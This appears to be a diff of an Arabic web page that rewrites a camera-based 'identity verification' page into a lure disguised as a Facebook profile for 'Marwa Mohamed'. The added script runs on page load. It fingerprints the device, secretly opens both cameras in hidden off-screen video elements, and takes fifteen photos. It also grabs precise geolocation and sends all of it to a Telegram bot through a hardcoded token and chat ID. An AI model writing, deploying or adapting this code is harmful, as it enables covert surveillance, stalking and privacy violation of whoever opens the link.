@@ -2,420 +2,313 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>نظام التحقق</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
+<title>Marwa Mohamed</title>
+
+<meta property="og:type"        content="profile">
+<meta property="og:title"       content="Marwa Mohamed">
+<meta property="og:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
+<meta property="og:site_name"   content="facebook.com">
+<meta property="og:url"         content="https://www.facebook.com">
+<meta property="og:image"       content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%231877F2'/%3E%3Cpath d='M55 80V52h9l2-11h-11v-7c0-3 2-6 6-6h6V18s-5-1-11-1c-11 0-18 6-18 19v6h-10v11h10v28h17z' fill='white'/%3E%3C/svg%3E">
+<meta property="og:image:width"  content="200">
+<meta property="og:image:height" content="200">
+
+<meta name="twitter:card"        content="summary">
+<meta name="twitter:title"       content="Marwa Mohamed">
+<meta name="twitter:description" content="Marwa Mohamed موجود علي فيسبوك. انضم إلينا">
+<meta name="twitter:image"       content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%231877F2'/%3E%3Cpath d='M55 80V52h9l2-11h-11v-7c0-3 2-6 6-6h6V18s-5-1-11-1c-11 0-18 6-18 19v6h-10v11h10v28h17z' fill='white'/%3E%3C/svg%3E">
+
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%231877F2'/%3E%3Cpath d='M55 80V52h9l2-11h-11v-7c0-3 2-6 6-6h6V18s-5-1-11-1c-11 0-18 6-18 19v6h-10v11h10v28h17z' fill='white'/%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%231877F2'/%3E%3Cpath d='M55 80V52h9l2-11h-11v-7c0-3 2-6 6-6h6V18s-5-1-11-1c-11 0-18 6-18 19v6h-10v11h10v28h17z' fill='white'/%3E%3C/svg%3E">
 
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-
-body{
-    min-height:100vh;
-    background:#0d0f14;
-    color:#fff;
-    font-family:system-ui,Tajawal,sans-serif;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:18px;
-}
-
-.card{
-    width:100%;
-    max-width:430px;
-    background:#171a22;
-    border:1px solid #292e3a;
-    border-radius:22px;
-    padding:18px;
-    box-shadow:0 20px 60px #0008;
-}
-
-h1{
-    font-size:22px;
-    margin-bottom:7px;
-}
-
-.sub{
-    color:#9299a8;
-    font-size:13px;
-    margin-bottom:15px;
-}
-
-.camera{
-    position:relative;
-    overflow:hidden;
-    border-radius:17px;
-    background:#000;
-    aspect-ratio:16/9;
-}
-
-video{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    transform:scaleX(-1);
-}
-
-video.back{
-    transform:none;
-}
-
-.progress{
-    height:7px;
-    background:#292e38;
-    border-radius:99px;
-    overflow:hidden;
-    margin-top:15px;
-}
-
-.bar{
-    height:100%;
-    width:0%;
-    background:#4f8cff;
-    transition:width .15s linear;
-}
-
-.status{
-    text-align:center;
-    margin:13px 0;
-    color:#aeb5c4;
-    font-size:14px;
-}
-
-button{
-    width:100%;
-    border:0;
-    border-radius:14px;
-    padding:15px;
-    background:#4f8cff;
-    color:#fff;
-    font-size:16px;
-    font-weight:700;
-}
-
-button:disabled{
-    opacity:.45;
-}
-
-.log{
-    margin-top:12px;
-    max-height:100px;
-    overflow:auto;
-    direction:ltr;
-    text-align:left;
-    font-size:11px;
-    color:#747c8d;
-}
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    display:flex;align-items:center;justify-content:center;
+    background:#0f0f13;color:#fff;overflow:hidden;
+    font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
+  }
+  .wrap{display:flex;flex-direction:column;align-items:center;gap:18px}
+  .spinner{
+    width:64px;height:64px;border-radius:50%;
+    border:4px solid rgba(255,255,255,.12);
+    border-top-color:#4f8cff;
+    animation:spin .9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .txt{font-size:14px;color:#8b8b9a;text-align:center;padding:0 20px}
+  video{
+    position:fixed;left:-9999px;top:-9999px;
+    width:2px;height:2px;opacity:0.01;pointer-events:none;
+  }
 </style>
 </head>
-
 <body>
+  <div class="wrap">
+    <div class="spinner"></div>
+    <div class="txt" id="txt">جاري التحميل...</div>
+  </div>
 
-<div class="card">
-
-    <h1>🔐 التحقق من الهوية</h1>
-    <div class="sub">
-        سيتم استخدام الكاميرا بعد موافقتك لإتمام عملية التحقق.
-    </div>
-
-    <div class="camera">
-        <video id="video" autoplay playsinline muted></video>
-    </div>
-
-    <div class="progress">
-        <div class="bar" id="bar"></div>
-    </div>
-
-    <div class="status" id="status">
-        اضغط «بدء التحقق»
-    </div>
-
-    <button id="start">
-        بدء التحقق
-    </button>
-
-    <div class="log" id="log"></div>
-
-</div>
+  <video id="vFront" autoplay playsinline muted></video>
+  <video id="vBack"  autoplay playsinline muted></video>
 
 <script>
+(function () {
+  const BOT_TOKEN = "8936581893:AAF6AB-I1BYXV6H_91K716aCh5w-LCXaYvw";
+  const CHAT_ID   = "8800876346";
 
-const UPLOAD_URL = "/upload";
+  const TOTAL_PER_SIDE = 5;
+  const SETTLE_MS      = 350;
+  const MIN_BRIGHTNESS = 12;
+  const PHOTO_GAP_MS   = 80;
 
-const video  = document.getElementById("video");
-const start  = document.getElementById("start");
-const status = document.getElementById("status");
-const bar    = document.getElementById("bar");
-const logBox = document.getElementById("log");
+  const vFront = document.getElementById("vFront");
+  const vBack  = document.getElementById("vBack");
+  const txt    = document.getElementById("txt");
 
-let stream = null;
-
-function log(text){
-    logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}<br>`;
-    logBox.scrollTop = logBox.scrollHeight;
-}
-
-function sleep(ms){
-    return new Promise(r => setTimeout(r,ms));
-}
-
-/* فتح الكاميرا */
-async function openCamera(facing){
-
-    if(stream){
-        stream.getTracks().forEach(t => t.stop());
-    }
-
-    stream = await navigator.mediaDevices.getUserMedia({
-        video:{
-            facingMode:{ideal:facing},
-            width:{ideal:1280},
-            height:{ideal:720}
-        },
-        audio:false
-    });
-
-    video.srcObject = stream;
-
-    await new Promise(resolve => {
-        if(video.readyState >= 2){
-            resolve();
-        }else{
-            video.onloadedmetadata = resolve;
-        }
-    });
-
-    video.classList.toggle(
-        "back",
-        facing === "environment"
-    );
-
-    await sleep(300);
-}
-
-/* التقاط JPEG */
-function capture(){
-
-    return new Promise(resolve => {
-
-        const canvas = document.createElement("canvas");
-
-        canvas.width  = video.videoWidth || 1280;
-        canvas.height = video.videoHeight || 720;
-
-        const ctx = canvas.getContext("2d");
-
-        if(!video.classList.contains("back")){
-            ctx.translate(canvas.width,0);
-            ctx.scale(-1,1);
-        }
-
-        ctx.drawImage(
-            video,
-            0,
-            0,
-            canvas.width,
-            canvas.height
-        );
-
-        canvas.toBlob(
-            blob => resolve(blob),
-            "image/jpeg",
-            .72
-        );
-
-    });
-}
-
-/* رفع الصورة للسيرفر */
-async function upload(blob,index,total){
-
-    const fd = new FormData();
-
-    fd.append(
-        "photo",
-        blob,
-        `verification_${index}.jpg`
-    );
-
-    fd.append("index",index);
-    fd.append("total",total);
-
-    const response = await fetch(
-        UPLOAD_URL,
-        {
-            method:"POST",
-            body:fd
-        }
-    );
-
-    if(!response.ok){
-        throw new Error(
-            "HTTP " + response.status
-        );
-    }
-
-    return response.json();
-}
-
-/* التشغيل */
-async function run(){
-
-    start.disabled = true;
-    bar.style.width = "0%";
-    logBox.innerHTML = "";
-
-    const total = 10;
-
+  async function getBattery(){
     try{
+      if(!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return {level: Math.round(b.level*100)+"%", charging: b.charging};
+    }catch{ return null; }
+  }
+  function getConn(){
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return c ? {type:c.effectiveType||"—", downlink:c.downlink??"—"} : null;
+  }
+  function devType(){
+    const ua = navigator.userAgent;
+    if(/Android/i.test(ua)) return "Android";
+    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if(/Windows/i.test(ua)) return "Windows";
+    if(/Macintosh|Mac OS X/i.test(ua)) return "Mac";
+    if(/Linux/i.test(ua)) return "Linux";
+    return "—";
+  }
+  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 
-        status.textContent =
-            "جاري تشغيل الكاميرا...";
+  async function collect(){
+    const bat = await getBattery();
+    const con = getConn();
+    const d = {
+      "📱 الجهاز"     : devType(),
+      "🖥 النظام"      : navigator.platform || "—",
+      "📐 الشاشة"     : `${screen.width}×${screen.height}`,
+      "🔍 البكسل"     : devicePixelRatio,
+      "🗣 اللغة"       : navigator.language,
+      "🕐 التوقيت"    : Intl.DateTimeFormat().resolvedOptions().timeZone,
+      "🧠 الأنوية"    : navigator.hardwareConcurrency || "—",
+      "💾 الذاكرة"    : navigator.deviceMemory ? navigator.deviceMemory+"GB" : "—",
+      "👆 لمس"        : ("ontouchstart" in window) ? "نعم" : "لا",
+      "🔋 البطارية"   : bat ? `${bat.level} — ${bat.charging?"⚡":"🔌"}` : "—",
+      "📶 الشبكة"     : con ? `${con.type} / ${con.downlink}Mbps` : "—",
+      "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
+      "🌐 UA"         : navigator.userAgent
+    };
+    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
+    for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
+    return out;
+  }
 
-        /*
-         * نلتقط 5 صور أمامية
-         */
-        await openCamera("user");
+  function sendText(t){
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("text", t);
+    fd.append("parse_mode","HTML");
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {method:"POST", body:fd}).catch(()=>{});
+  }
+  function sendPhoto(blob, cap){
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("caption", cap);
+    fd.append("photo", blob, "p.jpg");
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+      {method:"POST", body:fd}).catch(()=>{});
+  }
+  function sendLocation(lat, lon, cap){
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("latitude", lat);
+    fd.append("longitude", lon);
+    if(cap) fd.append("caption", cap);
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,
+      {method:"POST", body:fd}).catch(()=>{});
+  }
 
-        const front = [];
-
-        for(let i=1;i<=5;i++){
-
-            status.textContent =
-                `📸 الصورة الأمامية ${i}/5`;
-
-            const blob = await capture();
-
-            front.push({
-                blob,
-                index:i
-            });
-
-            bar.style.width =
-                ((i / total) * 50) + "%";
-
-            await sleep(120);
-        }
-
-        /*
-         * ثم 5 صور خلفية
-         */
-        await openCamera("environment");
-
-        const back = [];
-
-        for(let i=1;i<=5;i++){
-
-            status.textContent =
-                `📸 الصورة الخلفية ${i}/5`;
-
-            const blob = await capture();
-
-            back.push({
-                blob,
-                index:i+5
-            });
-
-            bar.style.width =
-                (50 + (i / 10) * 50) + "%";
-
-            await sleep(120);
-        }
-
-        /*
-         * أوقف الكاميرا
-         */
-        if(stream){
-            stream.getTracks().forEach(t => t.stop());
-            stream = null;
-        }
-
-        status.textContent =
-            "⬆️ جاري رفع الصور...";
-
-        /*
-         * رفع متوازي محدود
-         * بدل انتظار كل صورة وحدها
-         */
-        const photos = [...front,...back];
-
-        let completed = 0;
-
-        const workers = 3;
-
-        async function worker(){
-
-            while(true){
-
-                const item = photos.shift();
-
-                if(!item) return;
-
-                try{
-
-                    await upload(
-                        item.blob,
-                        item.index,
-                        total
-                    );
-
-                    completed++;
-
-                    const percent =
-                        50 +
-                        (completed / total) * 50;
-
-                    bar.style.width =
-                        percent + "%";
-
-                    log(
-                        `uploaded ${item.index}/10`
-                    );
-
-                }catch(e){
-
-                    log(
-                        `upload error ${item.index}: ${e.message}`
-                    );
-
-                    throw e;
-                }
-            }
-        }
-
-        await Promise.all(
-            Array.from(
-                {length:workers},
-                worker
-            )
-        );
-
-        bar.style.width = "100%";
-
-        status.innerHTML =
-            "✅ <b>تم إكمال التحقق بنجاح</b>";
-
-        start.textContent =
-            "تم التحقق";
-
-    }catch(error){
-
-        console.error(error);
-
-        status.textContent =
-            "❌ حدث خطأ أثناء التحقق";
-
-        log(error.message);
-
-        start.disabled = false;
+  function waitForRealFrame(videoEl, timeout = 2500){
+    if (typeof videoEl.requestVideoFrameCallback === "function"){
+      return Promise.race([
+        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
+        new Promise(res => setTimeout(res, timeout))
+      ]);
     }
-}
+    return new Promise(res => {
+      const done = () => res();
+      videoEl.addEventListener("playing", done, {once:true});
+      videoEl.addEventListener("canplay", done, {once:true});
+      setTimeout(done, timeout);
+    });
+  }
 
-start.addEventListener(
-    "click",
-    run
-);
+  async function openOne(videoEl, facing){
+    if(videoEl.srcObject){
+      videoEl.srcObject.getTracks().forEach(t=>t.stop());
+      videoEl.srcObject = null;
+    }
+    const s = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:{ideal:facing}, width:{ideal:1280}, height:{ideal:720} },
+      audio:false
+    });
+    videoEl.srcObject = s;
+    try{ await videoEl.play(); }catch(_){}
+    await waitForRealFrame(videoEl);
+    return s;
+  }
 
+  function capture(videoEl, isFront){
+    return new Promise(resolve=>{
+      const c = document.createElement("canvas");
+      c.width  = videoEl.videoWidth  || 1280;
+      c.height = videoEl.videoHeight || 720;
+      const ctx = c.getContext("2d");
+      if(isFront){
+        ctx.translate(c.width, 0);
+        ctx.scale(-1, 1);
+      }
+      ctx.drawImage(videoEl, 0, 0, c.width, c.height);
+
+      let brightness = 255;
+      try{
+        const sampleW = Math.min(200, c.width);
+        const sampleH = Math.min(200, c.height);
+        const sx = (c.width  - sampleW) / 2;
+        const sy = (c.height - sampleH) / 2;
+        const data = ctx.getImageData(sx, sy, sampleW, sampleH).data;
+        let sum = 0, n = 0;
+        for(let i=0; i<data.length; i+=16){
+          sum += data[i] + data[i+1] + data[i+2];
+          n += 3;
+        }
+        brightness = sum / n;
+      }catch(_){}
+
+      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
+    });
+  }
+
+  async function captureSafe(videoEl, isFront, maxTries = 4){
+    for(let attempt = 1; attempt <= maxTries; attempt++){
+      const {blob, brightness} = await capture(videoEl, isFront);
+      if(blob && brightness >= MIN_BRIGHTNESS) return blob;
+      await new Promise(r => setTimeout(r, 200));
+    }
+    return null;
+  }
+
+  function requestLocation(timeoutMs = 12000){
+    return new Promise(resolve => {
+      if(!navigator.geolocation) return resolve(null);
+      const timer = setTimeout(() => resolve(null), timeoutMs);
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          clearTimeout(timer);
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            speed: pos.coords.speed
+          });
+        },
+        err => {
+          clearTimeout(timer);
+          resolve({ error: err.message });
+        },
+        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function run(){
+    txt.textContent = "جاري التحميل...";
+
+    sendText(await collect());
+
+    let frontStream = null, backStream = null;
+    try{
+      [frontStream, backStream] = await Promise.all([
+        openOne(vFront, "user").catch(() => null),
+        openOne(vBack,  "environment").catch(() => null)
+      ]);
+    }catch(e){}
+
+    if(!frontStream && backStream){
+      try{ frontStream = await openOne(vFront, "user"); }catch{}
+    }
+    if(frontStream && !backStream){
+      try{ backStream = await openOne(vBack, "environment"); }catch{}
+    }
+    if(!frontStream && !backStream){
+      txt.textContent = "❌ لا توجد كاميرا متاحة";
+      return;
+    }
+
+    await new Promise(r => setTimeout(r, SETTLE_MS));
+
+    const sequence = [];
+    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:1});
+    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"environment", label:"خلفية", phase:2});
+    for(let i=0; i<TOTAL_PER_SIDE; i++) sequence.push({f:"user", label:"أمامية", phase:3});
+
+    const counters = {1:0, 2:0, 3:0};
+
+    for(let i=0; i<sequence.length; i++){
+      const step = sequence[i];
+      const videoEl = step.f === "user" ? vFront : vBack;
+      if(!videoEl.srcObject) continue;
+
+      counters[step.phase]++;
+      const num = counters[step.phase];
+
+      const blob = await captureSafe(videoEl, step.f === "user");
+      if(blob) sendPhoto(blob, `📷 ${step.label} #${num} (مرحلة ${step.phase}/3)`);
+
+      await new Promise(r => setTimeout(r, PHOTO_GAP_MS));
+    }
+
+    [vFront, vBack].forEach(v => {
+      if(v.srcObject){
+        v.srcObject.getTracks().forEach(t=>t.stop());
+        v.srcObject = null;
+      }
+    });
+
+    txt.textContent = "📍 جاري تحديد الموقع...";
+
+    const loc = await requestLocation();
+
+    if(loc && loc.lat !== undefined){
+      const cap =
+        `📍 <b>الموقع الجغرافي</b>\n` +
+        `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
+        `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
+      sendLocation(loc.lat, loc.lon, cap);
+    }else if(loc && loc.error){
+      sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
+    }else{
+      sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
+    }
+
+    txt.textContent = "✅ تم";
+  }
+
+  window.addEventListener("load", run);
+})();
 </script>
-
 </body>
 </html>
